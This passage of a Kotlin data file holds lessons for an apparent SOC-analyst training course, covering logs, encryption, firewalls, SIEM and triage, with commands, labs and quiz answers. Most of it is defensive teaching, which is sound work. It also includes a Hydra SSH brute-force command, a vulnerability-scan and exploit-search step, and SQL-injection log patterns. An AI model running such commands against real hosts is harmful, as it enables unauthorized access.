                "Lists all log files.",
                "See latest operating records.",
                "Displays user history logs.",
                "Shows all failed login histories.",
                "Starts live stream log.",
                "Enter invalid password to generate event.",
                "Observe user ID context.",
                "See configuration logs.",
                "Check kernel driver logs.",
                "Matches event logging logs."
            ),
            quiz = listOf(
                QuizQuestionModel("Which file records logins on Ubuntu?", listOf("syslog", "auth.log", "kern.log", "audit.log"), "auth.log"),
                QuizQuestionModel("What command shows past system logins?", listOf("last", "history", "whoami", "log-user"), "last"),
                QuizQuestionModel("What does logrotate do?", listOf("Decrypts logs", "Compresses, archives or rotates full logs", "Deletes database", "Pushes log web hooks"), "Compresses, archives or rotates full logs"),
                QuizQuestionModel("What does the 'lastb' command list?", listOf("Last boots", "Failed login matches", "Successful logs", "Running background apps"), "Failed login matches"),
                QuizQuestionModel("What tool is standard for logging centralizations?", listOf("SIEM", "IDS", "WAF", "IAM"), "SIEM")
            ),
            resources = listOf(
                ResourceModel("Syslog and event loggers", "https://tryhackme.com/room/investigatingwindows", "Deals with Windows incident monitoring", "TryHackMe", "red")
            )
        ),

        // PHASE 2: SECURITY FUNDAMENTALS
        LessonModel(
            id = 11,
            title = "CIA Triad & Frameworks",
            phase = 2,
            phaseName = "Security Fundamentals",
            durationMin = 25,
            theory = """
                The bedrock of security is the CIA Triad:
                • Confidentiality — Sensitive data must stay hidden (encryption, access lists).
                • Integrity — Data must not be modified in transit or rest (hashes, signatures).
                • Availability — Authorized nodes must have uninterrupted access (UPS, backups, cluster failovers).
                
                Standards and Frameworks:
                To structure security audits, we map operations to frameworks:
                • NIST CSF — National Institute of Standards (Identify, Protect, Detect, Respond, Recover).
                • ISO 27001 — Global operational standard centered on ISMS policies.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Integrity check", "sha256sum sensitive_data.json", "Validates integrity using a SHA256 cryptographic hash", "sha256sum document", "Security"),
                CommandModel("Encrypt file", "gpg -c sensitive_data.json", "Confidentiality protection using symmetric encryption", "gpg -c filename", "Security")
            ),
            labSteps = listOf(
                "Create file: touch sensitive_data.json.",
                "Generate integrity base: sha256sum sensitive_data.json > hash.txt.",
                "Symmetrically encrypt using local GPG tool.",
                "Verify file is unreadable using cat command.",
                "Decrypt file using local private credentials.",
                "Modify baseline data: echo 'altered' >> sensitive_data.json.",
                "Rerun sha256sum check.",
                "Observe mismatch between hash.txt and new file state.",
                "Evaluate NIST guidelines against local user systems.",
                "Chart out asset categories mapping to ISO controls."
            ),
            labHints = listOf(
                "Create mock file first.",
                "Saves base hash record.",
                "Secures content with passphrase.",
                "Confirm encryption scrambles content.",
                "Restores readable format.",
                "Simulates threat attack tamper.",
                "Get new file checksum.",
                "Confirms breach of Integrity.",
                "Review baseline compliance.",
                "Map your compliance parameters safely."
            ),
            quiz = listOf(
                QuizQuestionModel("What are the three pillars of the CIA Triad?", listOf("Cloud, Internet, Assets", "Confidentiality, Integrity, Availability", "Control, Intelligence, Action", "Collection, Inspection, Analysis"), "Confidentiality, Integrity, Availability"),
                QuizQuestionModel("Which mechanism enforces standard Confidentiality?", listOf("SHA256 hash", "RAID mirrors", "AES Encryption", "BIA backup"), "AES Encryption"),
                QuizQuestionModel("If an attacker tampers with database records, what is breached?", listOf("Confidentiality", "Integrity", "Availability", "Authentication"), "Integrity"),
                QuizQuestionModel("What is a primary protector of Availability?", listOf("Strong policies", "Cryptographic hashes", "Offsite redundant backups", "Web firewalls"), "Offsite redundant backups"),
                QuizQuestionModel("What does NIST stand for?", listOf("National Institute of Standards and Technology", "Network Inspection and Security Troubleshooting", "National Intelligence Security Team", "Node Integration Standard Template"), "National Institute of Standards and Technology")
            ),
            resources = listOf(
                ResourceModel("NIST Core Principles", "https://tryhackme.com/room/introtoitcybersecurity", "Covers the CIA Triad and security foundations", "TryHackMe", "red")
            )
        ),
        LessonModel(
            id = 12,
            title = "Firewalls IDS IPS",
            phase = 2,
            phaseName = "Security Fundamentals",
            durationMin = 35,
            theory = """
                A primary line of network defense:
                
                Firewalls:
                Inspect packet headers and IP addresses, filtering inbound/outbound packets based on rules.
                
                IDS (Intrusion Detection System):
                Passive watcher. Monitors active network traffic, parsing signatures of malware or known attacks. Alerts the console if triggered. It doesn't block packets! (e.g., Snort, Suricata).
                
                IPS (Intrusion Prevention System):
                Active defender. Inline placement. Blocks malicious traffic instantly when a signature triggers.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Snort trace", "snort -d -v -r capture.pcap", "Runs passive Snort detection on a security PCAP file", "snort -v -c /etc/snort/snort.conf", "Security"),
                CommandModel("IPtables block", "sudo iptables -A INPUT -s 10.0.0.99 -j DROP", "Drops all traffic coming from problematic IP", "iptables -A INPUT -s ... -j DROP", "Security"),
                CommandModel("UFW Block", "sudo ufw deny from 1.2.3.4", "Stops all external communication from blacklisted IP", "ufw deny from IP", "Security")
            ),
            labSteps = listOf(
                "Open terminal and view iptables: sudo iptables -L.",
                "Install localized Snort tool.",
                "Run Snort in packet logging mode.",
                "Construct rules file capturing port 80 web scans.",
                "Initiate custom attack scans against interface IP.",
                "Analyze Snort detection feedback logs.",
                "Add rule to drop threat IP using iptables INPUT block.",
                "Verify traffic from target is dropping cleanly.",
                "Examine Suricata log output formats.",
                "Perform alert classification categorization."
            ),
            labHints = listOf(
                "Shows active firewall policies.",
                "Installs detection engine.",
                "Monitor raw feeds on screen.",
                "Sets system triggers.",
                "Fires ping or port scans.",
                "Inspect details of alerts.",
                "Blocks threat IP packets.",
                "Verify target gets no responses.",
                "Parses alerts in JSON structure.",
                "Classifies alerts correctly."
            ),
            quiz = listOf(
                QuizQuestionModel("What is the primary difference between IDS and IPS?", listOf("IDS is hardware, IPS is software", "IDS only alerts, IPS actively blocks traffic", "IDS decrypts packets, IPS encrypts them", "IDS works on cloud nodes, IPS on physical ones"), "IDS only alerts, IPS actively blocks traffic"),
                QuizQuestionModel("Where is an IPS typically deployed?", listOf("In bypass passive mode", "Inline with network traffic", "Behind final endpoints", "Directly on cloud DNS nodes"), "Inline with network traffic"),
                QuizQuestionModel("Which of the following is an open-source IDS?", listOf("Nginx", "Wireshark", "Snort", "Metasploit"), "Snort"),
                QuizQuestionModel("What target action drops packets in an iptables rule?", listOf("REJECT", "DROP", "DENY", "BLOCK"), "DROP"),
                QuizQuestionModel("What type of firewall checks connection state?", listOf("Packet filter", "Stateful Inspection Firewall", "Proxy firewall", "WAF"), "Stateful Inspection Firewall")
            ),
            resources = listOf(
                ResourceModel("Snort Room", "https://tryhackme.com/room/snort", "Detailed Snort rule syntax and packet parsing", "TryHackMe", "red"),
                ResourceModel("Network Security Tools", "https://tryhackme.com/room/networksecuritysolutions", "IDS, IPS, and Firewall analysis configs", "TryHackMe", "red")
            )
        ),
        // LESSON 13
        LessonModel(
            id = 13,
            title = "VPNs PKI Encryption",
            phase = 2,
            phaseName = "Security Fundamentals",
            durationMin = 35,
            theory = """
                Encryption transforms raw human data (plaintext) into an unreadable state (ciphertext).
                
                Symmetric encryption uses the same key for both encryption and decryption (e.g., AES). Symmetric encryption is very fast.
                Asymmetric encryption uses a public key (to encrypt) and a private key (to decrypt) (e.g., RSA).
                
                Public Key Infrastructure (PKI) manages certificates and digital handshake trust (SSL/TLS).
                VPNs (Virtual Private Networks) build encrypted tunnels across public networks to secure work data.
            """.trimIndent(),
            commands = listOf(
                CommandModel("GPG asymmetric", "gpg --gen-key && gpg --encrypt --recipient user file", "Generates and utilizes public key encryption pairs", "gpg --gen-key", "Security"),
                CommandModel("OpenSSL connection", "openssl s_client -connect google.com:443", "Verifies and debugs SSL handshake connection parameters", "openssl s_client ...", "Network")
            ),
            labSteps = listOf(
                "Generate a fresh GPG key.",
                "Create a text file containing sensitive credentials.",
                "Encrypt the file using your newly generated key.",
                "Verify formatting block is encrypted ciphertext using cat.",
                "Import a trusted teammate's public key certificate.",
                "Establish and debug an HTTPS SSL handshake with openssl s_client.",
                "Check the certificate expiration dates and CA details.",
                "Inspect client-side configuration files for OpenVPN.",
                "Establish a secure, encrypted tunnel via OpenVPN CLI.",
                "Confirm network routing shifts securely under the VPN tunnel."
            ),
            labHints = listOf(
                "Establishes key pairs.",
                "Use a standard notepad config.",
                "Locks with cryptographic key.",
                "Ciphertext blocks should be random alphanumeric text.",
                "Enables remote communication encryption.",
                "Interrogates secure domain handshakes.",
                "Check certificate validity.",
                "Ensure client profile certificates remain valid.",
                "Tunnels outbound traffic.",
                "Check external IP before and after VPN."
            ),
            quiz = listOf(
                QuizQuestionModel("What cryptosystem uses public and private key pairs?", listOf("Symmetric cryptography", "Asymmetric cryptography", "Hashing algorithms", "Salt key structures"), "Asymmetric cryptography"),
                QuizQuestionModel("Which algorithm is standard for symmetric file encryption?", listOf("AES", "RSA", "Diffie-Hellman", "MD5"), "AES"),
                QuizQuestionModel("What is the job of a Certificate Authority (CA)?", listOf("Enforce route rules", "Sign and issue digital trust certificates", "Capture packets", "Scan vulnerabilities"), "Sign and issue digital trust certificates"),
                QuizQuestionModel("What protocol secures connection parameters in web browsers?", listOf("HTTP", "SSL/TLS", "SSH", "Telnet"), "SSL/TLS"),
                QuizQuestionModel("How does VPN protect transport channels?", listOf("Antivirus defense", "Encryption tunneling", "Malware sandboxing", "DNS translation"), "Encryption tunneling")
            ),
            resources = listOf(
                ResourceModel("Cryptographic Basics", "https://tryhackme.com/room/cryptography", "Classic and modern cryptosystems", "TryHackMe", "red")
            )
        ),
        // LESSON 14
        LessonModel(
            id = 14,
            title = "Vulnerability Assessment",
            phase = 2,
            phaseName = "Security Fundamentals",
            durationMin = 40,
            theory = """
                Vulnerabilities are weaknesses in systems, applications, or networks that attackers can exploit.
                
                We use scanners (like Nessus or OpenVAS) to sweep network nodes, mapping versions to databases of known vulnerabilities.
                
                Key catalogs and systems:
                • CVE (Common Vulnerabilities and Exposures) — Alphanumeric unique IDs cataloging security flaws.
                • CVSS (Common Vulnerability Scoring System) — Quantitative risk score running from 0.0 (None) to 10.0 (Critical).
            """.trimIndent(),
            commands = listOf(
                CommandModel("Nmap vuln", "nmap --script vuln 192.168.1.1", "Launches vulnerability audits on targets with Nmap NSE scripts", "nmap --script vuln target", "Security"),
                CommandModel("CVE query", "searchsploit \"Apache 2.4.49\"", "Discovers local exploits targeting specific server versions", "searchsploit software", "Security")
            ),
            labSteps = listOf(
                "Review Nmap NSE script libraries.",
                "Launch safe, targeted vulnerability scans on local systems.",
                "Identify unpatched server software versions.",
                "Query searchsploit for exploit payloads.",
                "Read of CVE specifications.",
                "Examine vulnerabilities scoring above 9.0 on CVSS.",
                "Review security advisory updates from vendors.",
                "Draft remediation plans (patch updates, workarounds).",
                "Apply the recommended software patches.",
                "Rescan system to confirm the vulnerabilities are fixed."
            ),
            labHints = listOf(
                "Find locations of NSE scripts.",
                "Target localized testing nodes.",
                "Compare version numbers.",
                "Searches Exploit Database offline.",
                "Explore national databases online.",
                "Requires immediate emergency patching.",
                "Review Microsoft/Ubuntu advisory feeds.",
                "Documents mitigation paths.",
                "Close target software holes.",
                "Verifies successful fix validation."
            ),
            quiz = listOf(
                QuizQuestionModel("What does CVE stand for?", listOf("Common Vulnerability and Exposure", "Cloud Virtualization Environment", "Central Volume Encryptor", "Control Verification Engine"), "Common Vulnerability and Exposure"),
                QuizQuestionModel("What is the highest possible severity rating score in CVSS?", listOf("1.0", "5.0", "10.0", "15.0"), "10.0"),
                QuizQuestionModel("Which tool represents an enterprise vulnerability scanner?", listOf("Wireshark", "Nessus", "Metasploit", "Snort"), "Nessus"),
                QuizQuestionModel("What does searchsploit query?", listOf("Active ports", "Offline copy of Exploit-DB", "Nessus servers", "Active processes"), "Offline copy of Exploit-DB"),
                QuizQuestionModel("What is the goal of a vulnerability assessment?", listOf("Deceive attackers", "Identify, catalog and prioritize system weaknesses", "Exfiltrate company logins", "Automate script installations"), "Identify, catalog and prioritize system weaknesses")
            ),
            resources = listOf(
                ResourceModel("CVE and Scanning", "https://tryhackme.com/room/rpnessus", "Vulnerability management with Nessus", "TryHackMe", "red")
            )
        ),
        // LESSON 15
        LessonModel(
            id = 15,
            title = "Authentication & MFA",
            phase = 2,
            phaseName = "Security Fundamentals",
            durationMin = 25,
            theory = """
                Authentication verifies who you are. Authorization restricts what you can do.
                
                Passwords are the fallback entry target. We enforce complex access rules and Multi-Factor Authentication (MFA).
                
                Authentication types:
                - What you know: password, pattern.
                - What you have: security key, authenticator app (TOTP).
                - What you are: fingerprint, facial ID (biometrics).
            """.trimIndent(),
            commands = listOf(
                CommandModel("Hydra pass-force", "hydra -l admin -P passlist.txt ssh://10.0.0.1", "Simulates credential-stuffing defense capabilities", "hydra -l user -p password Target", "Security"),
                CommandModel("Pam config", "sudo cat /etc/pam.d/common-password", "Check Linux rules for password length and complexity", "cat /etc/pam.d/common-password", "Linux")
            ),
            labSteps = listOf(
                "Review complex password setups.",
                "Analyze active pam configurations.",
                "Establish password aging policy limitations.",
                "Download a standard MFA application.",
                "Generate a mock TOTP configuration code.",
                "Configure a secure SSH shell channel.",
                "Enforce MFA logins on remote logins.",
                "Test logins without MFA keys to confirm rejection.",
                "Check authentication success events.",
                "Confirm failed logins generate security Event ID 4625."
            ),
            labHints = listOf(
                "Review length and characters regulations.",
                "Audit Linux authentication module.",
                "Prevents reusing old passwords indefinitely.",
                "Select Google or Microsoft Authenticator.",
                "Saves initialization key.",
                "Adjust secure configuration files.",
                "Adds second factor validation layer.",
                "Confirms secure blocking block.",
                "Check logs generate normal auth flags.",
                "Verifies target captures anomalies."
            ),
            quiz = listOf(
                QuizQuestionModel("What authentication category is a fingerprint?", listOf("What you know", "What you have", "What you are", "Where you are"), "What you are"),
                QuizQuestionModel("What is an example of 'What you have' authentication?", listOf("A hard password", "An SMS passcode or hardware key", "A pattern", "A face scan"), "An SMS passcode or hardware key"),
                QuizQuestionModel("What does TOTP stand for?", listOf("Time-based One-Time Password", "Total Operation Trust Protocol", "Tunnel Opening Trust Pass", "Technological OAuth Token Pivot"), "Time-based One-Time Password"),
                QuizQuestionModel("Which protocol is standard for federated single sign-on?", listOf("SAML", "SMTP", "SSH", "SMB"), "SAML"),
                QuizQuestionModel("What is the main goal of MFA?", listOf("Speed up loading", "Require multiple independent factors to prove identity", "Reduce database storage scale", "Limit bandwidth usage"), "Require multiple independent factors to prove identity")
            ),
            resources = listOf(
                ResourceModel("MFA security room", "https://tryhackme.com/room/authenticationprotocols", "Authentication systems and protocols", "TryHackMe", "red")
            )
        ),

        // PHASE 3: SOC CORE SKILLS
        LessonModel(
            id = 16,
            title = "SOC Structure & Roles",
            phase = 3,
            phaseName = "SOC Core Skills",
            durationMin = 20,
            theory = """
                A SOC (Security Operations Center) represents the frontline operational monitoring hub.
                
                SOC analyst positions:
                • Tier 1 (Alert Triage) — Continuously monitors SIEM dashboards, triages alert noise, filters false positives, and escalates true threat anomalies.
                • Tier 2 (Incident Response) — Deep dive forensics, active threat containment, memory dumps, and eradication actions.
                • Tier 3 (Threat Hunter) — Proactively hunts for stealthy adversaries hidden in network endpoints, ignoring SIEM alerts.
                • SOC Manager — Coordinates team resources, logs, client communications, and SLAs.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Escalation script", "echo 'ALERT: Priority 1 Host Breach' > /var/log/soc_tier1.log", "Puisne alert system record for L1 simulation", "echo 'Alert' >> file", "Security")
            ),
            labSteps = listOf(
                "Analyze structural charts of typical enterprise SOCs.",
                "Draft mock Ticket templates detailing incident scenarios.",
                "Perform alert classification exercises on simulated logs.",
                "Assign severity labels (Low, Medium, High, Critical).",
                "Draft incident escalation notes for Tier 2 teams.",
                "Document evidence collection steps.",
                "Verify ticket ownership shifts cleanly in tracking systems.",
                "Review SOC metrics like MTTR (Mean Time to Respond).",
                "Simulate shifts handover procedures.",
                "Conduct post-incident reviews of target operations."
            ),
            labHints = listOf(
                "Examine roles standard flow chart.",
                "Include host IP, time, and severity indicators.",
                "Filter false alarms from malicious anomalies.",
                "Based on scope and damage potential.",
                "Escalates priority levels.",
                "Keep clear chain-of-custody logs.",
                "Prevents duplicate tracking errors.",
                "MTTR measures analytical speed.",
                "Document priority events.",
                "Drives continuous improvements."
            ),
            quiz = listOf(
                QuizQuestionModel("What is the primary role of a Tier 1 SOC Analyst?", listOf("Fix database software issues", "Monitor, triage and escalate alerts", "Write production web programs", "Approve payroll updates"), "Monitor, triage and escalate alerts"),
                QuizQuestionModel("What tier handles deep-dive forensics and active containment?", listOf("Tier 1", "Tier 2", "Tier 3", "SOC Manager"), "Tier 2"),
                QuizQuestionModel("What team member proactively searches for undetected threats?", listOf("Tier 1 Alert Analyst", "Infrastructure Engineer", "Tier 3 Threat Hunter", "Compliance Manager"), "Tier 3 Threat Hunter"),
                QuizQuestionModel("What metric represents 'Mean Time to Detect'?", listOf("MTTD", "MTTR", "SLA", "KPI"), "MTTD"),
                QuizQuestionModel("What documentation holds incident response playbooks?", listOf("SOP / Playbooks", "SLA policy", "CVSS specifications", "GPO layouts"), "SOP / Playbooks")
            ),
            resources = listOf(
                ResourceModel("Junior SOC Analyst Intro", "https://tryhackme.com/room/juniorsocanalystintro", "A day in the life of a SOC analyst", "TryHackMe", "red")
            )
        ),
        LessonModel(
            id = 17,
            title = "SIEM Fundamentals",
            phase = 3,
            phaseName = "SOC Core Skills",
            durationMin = 45,
            theory = """
                SIEM is the nervous system of the SOC.
                
                SIEM (Security Information and Event Management) aggregates logs from endpoints, servers, firewalls, and directory hosts into a single database, indexing logs for fast analysis and correlation.
                
                Core platforms: Splunk, ELK Stack (Elastic), Microsoft Sentinel.
                
                Workflows: Log Ingestion -> Parsing & Indexing -> Dashboard Visualization -> Correlation Rules -> Alerting.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Splunk Query", "index=security sourcetype=WinEventLog EventCode=4625 | stats count by user", "Retrieves failed logins grouped by user in Splunk (SPL)", "index=security EventCode=4625", "Security"),
                CommandModel("Elastic Query", "GET /_search?q=event.code:4625", "Runs an API search query targeting Elastic indexes", "GET /security-logs*/_search", "Security")
            ),
            labSteps = listOf(
                "Understand Splunk SPL parsing syntax.",
                "Log into demo SIEM environments.",
                "Search security logs for failed login attempts.",
                "Construct queries to show logins from the last 24 hours.",
                "Analyze event results in aggregate tables.",
                "Build visualization graphs tracking login spikes.",
                "Draft custom correlation rules for credential stuffing.",
                "Apply rule to fire alerts on 5 failed logins within 1 minute.",
                "Trigger the alert via mock credential tests.",
                "Review the triggered analyst alert ticket."
            ),
            labHints = listOf(
                "Learn operators: stats, eval, table.",
                "Splunk or Elastic have free developer licenses.",
                "Search with 'EventCode=4625' parameter.",
                "Use temporal filters in queries.",
                "Table results by User, IP, and Host.",
                "Convert text lists to visual charts.",
                "Correlate events coming from identical sources.",
                "Prevents alerting on single typos.",
                "Simulates threat attack vectors.",
                "Verifies correct pipeline flow."
            ),
            quiz = listOf(
                QuizQuestionModel("What does SIEM stand for?", listOf("Systemic Integration and Email Management", "Security Information and Event Management", "Software Installation and Engine Monitor", "Secure Network Interface Enforcement Modulo"), "Security Information and Event Management"),
                QuizQuestionModel("Which of the following is an enterprise SIEM tool?", listOf("Nmap", "Metasploit", "Splunk", "Cisco Router"), "Splunk"),
                QuizQuestionModel("What query language does Splunk utilize?", listOf("SQL", "SPL", "KQL", "Bash"), "SPL"),
                QuizQuestionModel("What process normalizes raw log details into uniform fields?", listOf("Encryption", "Hashing", "Parsing / Normalization", "Compression"), "Parsing / Normalization"),
                QuizQuestionModel("What is a correlation rule?", listOf("A physical backup system", "An alert rule matching specific criteria across multiple logs", "A password validation engine", "A network routing rule"), "An alert rule matching specific criteria across multiple logs")
            ),
            resources = listOf(
                ResourceModel("SIEM Primer Suite", "https://tryhackme.com/room/splunk101", "Splunk core searching skills", "TryHackMe", "red")
            )
        ),
        // LESSON 18
        LessonModel(
            id = 18,
            title = "Log Analysis",
            phase = 3,
            phaseName = "SOC Core Skills",
            durationMin = 40,
            theory = """
                Security logs contain the hard evidence of threat activities.
                
                Common logs:
                • Nginx / Web server logs (access.log): records IP, timestamp, HTTP method (GET/POST), requested URL, and HTTP status codes (200 OK, 404 Not Found, 500 Server Error).
                • Web shell indicator: POST requests hitting /uploads/ directory or raw .php execution pages yielding status code 200.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Apache count", "awk '{print \$1}' access.log | sort | uniq -c | sort -rn | head -10", "Extracts top 10 IP addresses hitting web server from access logs", "awk '{print \$1}' logfile", "Security"),
                CommandModel("Find web shells", "grep -i \"select\" access.log | grep -i \"from\"", "Searches logs for SQL Injection attack keywords", "grep 'select' access.log", "Security")
            ),
            labSteps = listOf(
                "Locate test web access logs.",
                "Extract requesting IP arrays.",
                "Sort IPs to show count of requests.",
                "Filter for abnormal GET requests hitting system scripts.",
                "Search logs for SQL Injection strings (like UNION SELECT).",
                "Analyze web log status outputs (watch for spikes in 500 errors).",
                "Review remote path anomalies inside logs.",
                "Map anomalous request IPs to threat feeds.",
                "Generate threat containment scripts mapping problem IPs.",
                "Verify traffic drops once blocklists activate."
            ),
            labHints = listOf(
                "Check access.log locations.",
                "Pull data using awk commands.",
                "Use sort and uniq tools.",
                "Spot rogue PHP or bash executables.",
                "Reveals structural attack attempts.",
                "Can indicate server crashing or scanning.",
                "Look for '../' directory traversal.",
                "Determine geographical request targets.",
                "Construct local blocks.",
                "Ensure logging registers block triggers."
            ),
            quiz = listOf(
                QuizQuestionModel("What does HTTP status code 404 represent?", listOf("Successful request", "Internal server error", "Page Not Found", "Unauthorized access"), "Page Not Found"),
                QuizQuestionModel("An attacker runs SQL injection. What keyword might show in logs?", listOf("PING", "get-process", "UNION SELECT", "mkdir"), "UNION SELECT"),
                QuizQuestionModel("What CLI utility extracts specific log columns comfortably?", listOf("grep", "cat", "awk", "nano"), "awk"),
                QuizQuestionModel("What status code indicates a successful request?", listOf("404", "500", "200", "301"), "200"),
                QuizQuestionModel("What log tracks file actions and remote downloads on web servers?", listOf("syslog", "auth.log", "access.log", "boot.log"), "access.log")
            ),
            resources = listOf(
                ResourceModel("Web Log Investigation", "https://tryhackme.com/room/introtoitcybersecurity", "Analyzing security incidents from log records", "TryHackMe", "red")
            )
        ),
        // LESSON 19
        LessonModel(
            id = 19,
            title = "Alert Triage",
            phase = 3,
            phaseName = "SOC Core Skills",
            durationMin = 30,
            theory = """
                Alert Triage is the daily workflow of checking, classifying, and managing incoming SIEM alerts.
                
                The main challenge is separating False Positives (benign events misidentified as security threats) from True Positives (actual security incidents requiring action).
            """.trimIndent(),
            commands = listOf(
                CommandModel("Whois Check", "whois 8.8.8.8", "Queries registry details for remote host IP ownership", "whois IP", "Network")
            ),
            labSteps = listOf(
                "Review current alert list in your queue.",
                "Determine the system context of the triggered alert.",
                "Assess if the activity matches a known safe backup task.",
                "Compare the system name and IP address ranges.",
                "Lookup external threat indicators on VirusTotal.",
                "Verify alert source details.",
                "Mark alert as a False Positive if verified benign.",
                "If malicious, escalate alert to True Positive status.",
                "Initiate response playbooks for confirmed incidents.",
                "Document findings and close case tickets."
            ),
            labHints = listOf(
                "Work on mock UI queue lists.",
                "Helps identify business context.",
                "These are common false alarm triggers.",
                "Determine if IP is internal or public.",
                "Checks if IP carries bad reputations.",
                "Compare MAC/host names databases.",
                "Releases system restrictions.",
                "Initiates containment protocols.",
                "Enforce isolation mechanisms.",
                "Provides details of closed loops."
            ),
            quiz = listOf(
                QuizQuestionModel("What is a False Positive?", listOf("A malicious action missed by security checks", "A benign event incorrectly flagged as a security threat", "A system database recovery event", "A successful remote system login"), "A benign event incorrectly flagged as a security threat"),
                QuizQuestionModel("What is a True Positive?", listOf("An actual security incident requiring active response", "A successful backup synchronization task", "A standard password update event", "A false alarm"), "An actual security incident requiring active response"),
                QuizQuestionModel("If an antivirus blocks a critical system component, what is this called?", listOf("False Positive", "True Positive", "Eradication", "Detection leak"), "False Positive"),
                QuizQuestionModel("What online intelligence tool checks IP reputations?", listOf("Nmap", "ExplainShell", "VirusTotal", "Splunk"), "VirusTotal"),
                QuizQuestionModel("What is the first step in Alert Triage?", listOf("Format the hard drive", "Validate and verify the alert details", "Alert all users", "Shut down the power supply"), "Validate and verify the alert details")
            ),
            resources = listOf(
                ResourceModel("Triage and Incidents", "https://tryhackme.com/room/juniorsocanalystintro", "Practice triaging real alert flows", "TryHackMe", "red")
            )
        ),
        // LESSON 20
        LessonModel(
            id = 20,
            title = "Network Traffic Analysis",
            phase = 3,
            phaseName = "SOC Core Skills",
            durationMin = 40,
            theory = """
                Network security analysts analyze network packets (PCAP data) to identify malicious activities, file exfiltration, and command-and-control communication.
                
                Analysis tools:
                • Wireshark — Graphical user interface for deep-dive packet inspection.
                • Tshark / Tcpdump — CLI network parsing tools for high-speed indexing.
            """.trimIndent(),
            commands = listOf(
                CommandModel("Tshark fields", "tshark -r capture.pcap -T fields -e ip.src -e ip.dst", "Extracts src/dst IP addresses using tshark", "tshark -r file", "Security"),
                CommandModel("Wireshark Filter", "ip.addr == 10.0.0.5 && tcp.flags.syn == 1", "Custom Wireshark filter syntax targeting connection starts", "ip.addr == IP", "Network")
            ),
            labSteps = listOf(
                "Open test PCAP file in Wireshark.",
                "Apply display filters to show only DNS traffic (filter: dns).",
                "Search for abnormal, long domain requests (DNS tunneling indicators).",
                "Apply display filters for HTTP traffic (filter: http).",
                "Identify unencrypted GET requests in http streams.",
                "Right-click an HTTP packet -> Follow -> TCP Stream.",
                "Inspect the payload for raw file transfers or cleartext passwords.",
                "Filter for TCP SYN scan patterns.",
                "Extract transferred objects: File -> Export Objects -> HTTP.",
                "Calculate hash integrity of extracted files."
            ),
            labHints = listOf(
                "Launches capture file.",
                "Isolates DNS requests.",
                "Look for base64 strings in queries.",
                "Hides non-web traffic elements.",
                "Look for system commands in URL fields.",
                "Assembles fragmented packets into readable text context.",
                "Inspect web transmissions.",
                "Syn packets stream targets multiple ports.",
                "Saves files transferred over unencrypted channels.",
                "Check hashes on VirusTotal database."
            ),
            quiz = listOf(
                QuizQuestionModel("What tool is a CLI-based alternative to Wireshark?", listOf("Splunk", "Nessus", "Tshark / Tcpdump", "Metasploit"), "Tshark / Tcpdump"),
                QuizQuestionModel("What Wireshark feature reconstructs a complete connection conversation?", listOf("Follow TCP Stream", "Export Objects", "IP Mapping", "DNS Parse"), "Follow TCP Stream"),
                QuizQuestionModel("Which Wireshark filter shows only DNS requests?", listOf("dns", "tcp.port == 53", "dns || port 53", "dns"), "dns"),
                QuizQuestionModel("What does a flood of SYN-only packets typically represent?", listOf("File backup sequence", "SYN Flood / Port Scan", "Encrypted VPN session", "DHCP negotiation"), "SYN Flood / Port Scan"),
                QuizQuestionModel("Which protocol transmits data in unencrypted text?", listOf("HTTPS", "SSH", "HTTP", "SFTP"), "HTTP")
            ),
            resources = listOf(
                ResourceModel("Wireshark deep packet analysis", "https://tryhackme.com/room/wiresharkthebasics", "Deals with Wireshark structures", "TryHackMe", "red")
            )
        ),
        // LESSON 21
        LessonModel(
            id = 21,
            title = "Threat Intelligence & MITRE ATT&CK",
            phase = 3,
            phaseName = "SOC Core Skills",
            durationMin = 35,
            theory = """
                Cyber Threat Intelligence (CTI) is the practice of gathering, analyzing, and applying information about cyber threats to protect systems.
                
                Indicators of Compromise (IOCs):
                • Malicious IP addresses, domain names, file hashes (MD5, SHA256), registry keys.
                
                The MITRE ATT&CK Matrix:
                A globally-accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations. Tactics represent structural goals (e.g., Persistence), techniques represent how they achieve it (e.g., Web Shell).
            """.trimIndent(),
            commands = listOf(
                CommandModel("MITRE lookup", "curl -s \"https://attack.mitre.org/techniques/T1505/003/\"", "Fetches MITRE technique T1505.003 details via command line", "curl -s ...", "Security")
            ),
            labSteps = listOf(
                "Access the MITRE ATT&CK matrix website.",
                "Identify the 'Initial Access' category list.",
                "Review technique T1190 (Exploit Public-Facing Application).",
                "Inspect the threat actors using this technique.",
                "Explore techniques mapping to Persistence.",
                "Analyze Indicators of Compromise from threat intelligence feeds.",
                "Extract bad IP feeds into file lists.",
                "Configure security rules blocking threat IPs.",
                "Translate threat indicators into SIEM queries.",
                "Verify security detections trigger alerts on IOC matches."
            ),
            labHints = listOf(
                "Visit attack.mitre.org.",
                "Tactics represent the horizontal column headings.",
                "Commonly used to target web servers.",
                "Review groups like APT29 or APT41.",
                "Look for startup configurations and Cron tasks.",
                "Uses threat intelligence platforms.",
                "Maintains blacklist files.",
                "Update firewalls or IDS structures.",
                "Index indicators internally for matches.",
                "Ensures the system blocks threats."
            ),
            quiz = listOf(
                QuizQuestionModel("What are TTPs in threat intelligence?", listOf("Time, Target, Protocols", "Tactics, Techniques, and Procedures", "Testing, Tools, and Portfolios", "Trace, Target, Protection"), "Tactics, Techniques, and Procedures"),
                QuizQuestionModel("What is an example of an Indicator of Compromise (IOC)?", listOf("A normal user password change", "A malicious file SHA256 hash", "A regular system backup task", "A standard SSH connection from internal admin"), "A malicious file SHA256 hash"),
                QuizQuestionModel("Which framework indexes adversary tactics and techniques?", listOf("NIST CSF", "MITRE ATT&CK", "ISO 27001", "CVSS"), "MITRE ATT&CK"),
                QuizQuestionModel("In MITRE ATT&CK, what is a 'Tactic'?", listOf("A specific software tool", "The adversary's tactical goal (e.g. Credential Access)", "A quantitative risk score", "A specific alert filter"), "The adversary's tactical goal (e.g. Credential Access)"),
                QuizQuestionModel("What platform tracks threat feeds and IOC sharing?", listOf("SIEM", "MISP", "Wazuh", "Nmap"), "MISP")
            ),
            resources = listOf(
                ResourceModel("MITRE ATT&CK usage", "https://tryhackme.com/room/mitre", "Deploying the ATT&CK matrix in SOC analysis", "TryHackMe", "red")
            )
        ),
        // LESSON 22
        LessonModel(
            id = 22,
            title = "Malware Analysis Basics",
            phase = 3,
            phaseName = "SOC Core Skills",
            durationMin = 40,
            theory = """
